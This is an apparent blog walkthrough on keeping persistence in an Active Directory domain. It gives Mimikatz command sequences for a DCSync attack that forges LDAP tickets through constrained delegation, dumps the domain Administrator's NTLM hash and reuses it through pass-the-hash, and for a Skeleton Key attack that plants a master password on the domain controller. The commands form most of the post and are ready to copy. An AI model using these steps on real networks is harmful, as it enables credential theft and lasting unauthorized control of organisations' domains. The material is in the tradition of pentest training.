---
title: "Active Directory - Persistence Domain"
tags: [Metodologies]
categories: ActiveDirectory
mermaid: true
image: https://www.safesystems.com/wp-content/uploads/2020/04/Microsofts-LDAP-Security-Update-and-the-Impact-on-Financial-Institutions-Today-Header-Blog-Image.png
---

# Active Directory - Persistence Domain

Here you will find some commands to explore Active Directory.

Commands linked to Persistence on the Domain. An excellent way to keep the access on.

Hope you enjoy.

# Summary

- [Active Directory - Persistence Domain](#active-directory---persistence-domain)
- [Summary](#summary)
- [Initial Consideration](#initial-consideration)
- [DCSYnc](#dcsync)
- [Skeleton Key](#skeleton-key)

![](https://0x4rt3mis.github.io/assets/img/active-enum/persistencia.png)

# Initial Consideration

Here, we will cover two techniques that are widely used when it comes to persistence in Active Directory environments, the `DCSync` attack and the `Skeleton Key`

It is important to note that we must have Domain Controller access to perform these attacks, as they are tied to post-exploitation.

# DCSYnc

With the DCSync attack we will have access to the DC Administrator's hash and consequently the machine through the PTH

The idea is similar to Constrained Delegation, but we are going to generate tickets to LDAP and through this generated ticket get the administrator's hash!

We generate the ticket to LDAP and inject it

```ps1
tgt::ask /user:dbservice /domain:DOMÍNIO /ntlm:HASH_DO_DBSERVICE /ticket:dbservice.kirbi
tgs::s4u /tgt:TGT_dbservice@XXXX_krbtgt~XXXX@XXXX.kirbi /user:Administrator@XXXX /service:time/XXXXX.local|ldap/XXXX.local
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@XXXX@XXXX_ldap~XXXX@XXXX_ALT.kirbi"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/persistencia1.png)

Now we execute the DCSync attack and extract the admin hash

```ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:usfun\Administrator"'
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/persistencia2.png)

With th hash it's easier to make a PTH and get access to DC

```ps1
Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:XXXXXX /ntlm:hash_administrator_dc /run:powershell.exe"'
Enter-PSSession -ComputerName dc
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/persistencia3.png)

This was the `DCSync` attack, from Constrained Delegation we were able to generate tickets to LDAP and thus extract the ntlm hash of the administrator of the DC!

# Skeleton Key

The next attack is called `Skeleton Key`, it has that name because it will allow us to access any machine in the domain with a master password, once we take control of the DC.

Note that here it is necessary to be already inside the machine, so executing this attack after a DCSync, for example

After taking control of the DC, with a reverse shell anyway.

We "download" the mimikatz to the machine `MUST BE THE .EXE` and execute the attack

```ps1
privilege::debug
misc::skeleton
```

![](https://0x4rt3mis.github.io/assets/img/active-enum/esc.png)

Ready! Done! We now accept any machine in the domain with the `mimikatz` credential

![](https://0x4rt3mis.github.io/assets/img/active-enum/esc1.png)

It is important to point out that this attack can only be done once, so if when you try to do it, it may be wrong, it may be that someone else has already performed it in the domain.